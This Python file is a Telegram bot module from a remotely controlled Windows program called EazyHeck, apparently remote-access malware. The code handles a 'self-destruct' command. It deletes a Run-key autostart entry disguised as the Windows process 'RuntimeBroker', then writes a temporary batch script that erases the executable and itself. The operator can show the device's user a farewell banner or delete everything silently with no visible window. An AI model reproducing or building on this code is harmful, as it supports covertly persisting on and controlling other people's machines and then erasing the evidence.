from aiogram import Router
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import random, os, sys, subprocess, winreg, tempfile

router = Router()

class SelfDestructState(StatesGroup):
    waiting_code = State()

def gen_code():
    return str(random.randint(1000, 9999))

def remove_from_registry():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "RuntimeBroker")
        winreg.CloseKey(key)
    except Exception:
        pass

def show_farewell_and_delete(exe_path):
    bat = os.path.join(tempfile.gettempdir(), "farewell_ez.bat")
    # Пишем построчно чтобы избежать проблем с кодировкой
    lines = [
        "@echo off",
        "color 0A",
        "cls",
        "echo.",
        "echo EEEEE   A   ZZZZZ Y   Y H   H EEEEE  CCC  K   K",
        "echo E      A A     Z   Y Y  H   H E     C   C K  K ",
        "echo EEEE  AAAAA   Z     Y   HHHHH EEEE  C     KKK  ",
        "echo E     A   A  Z      Y   H   H E     C   C K  K ",
        "echo EEEEE A   A ZZZZZ   Y   H   H EEEEE  CCC  K   K",
        "echo.",
        "echo   EazyHeck uspeshno udalyon s etogo ustrojstva.",
        "echo   Soedinenie poteriano.",
        "echo.",
        "echo   Nazhmite Enter dlya zakrytiya...",
        "pause > nul",
        f'del /f /q "{exe_path}"',
        'del /f /q "%~f0"',
    ]
    with open(bat, "w", encoding="cp866", errors="replace") as f:
        f.write("\n".join(lines))
    subprocess.Popen(
        f'start cmd /k "{bat}"',
        shell=True
    )

def show_farewell_silent(exe_path):
    bat = os.path.join(tempfile.gettempdir(), "cleanup_ez.bat")
    with open(bat, "w") as f:
        f.write(f'@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"\n')
    subprocess.Popen(["cmd", "/c", bat], creationflags=subprocess.CREATE_NO_WINDOW)

@router.message(lambda m: m.text == "💣 Самоуничтожение")
async def selfdestr_start(message: Message, state: FSMContext):
    code = gen_code()
    await state.update_data(code=code)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="sd_cancel", style="success")]
    ])
    await message.answer(
        f"💣 <b>Самоуничтожение</b>\n\n"
        f"Это удалит EazyHeck с устройства безвозвратно.\n\n"
        f"Введи код: <code>{code}</code>",
        reply_markup=kb
    )
    await state.set_state(SelfDestructState.waiting_code)

@router.callback_query(lambda c: c.data == "sd_cancel")
async def sd_cancel(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("✅ Отменено.")
    await callback.answer()

@router.message(SelfDestructState.waiting_code)
async def sd_check_code(message: Message, state: FSMContext):
    data = await state.get_data()
    if message.text.strip() != data.get("code"):
        await message.answer("❌ Неверный код.")
        return
    await state.clear()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Уведомить", callback_data="sd_notify", style="danger"),
         InlineKeyboardButton(text="🔇 Тихо", callback_data="sd_silent", style="primary")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="sd_cancel2", style="success")]
    ])
    await message.answer("👤 Показать пользователю сообщение об удалении?", reply_markup=kb)

@router.callback_query(lambda c: c.data == "sd_cancel2")
async def sd_cancel2(callback: CallbackQuery):
    await callback.message.edit_text("✅ Отменено.")
    await callback.answer()

@router.callback_query(lambda c: c.data in ["sd_notify", "sd_silent"])
async def sd_execute(callback: CallbackQuery):
    notify = callback.data == "sd_notify"
    await callback.message.edit_text("💣 Удаляю EazyHeck...")
    await callback.answer()
    remove_from_registry()
    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
    if notify:
        show_farewell_and_delete(exe)
    else:
        show_farewell_silent(exe)
    await callback.message.answer("🔌 Соединение потеряно.")
    os._exit(0)
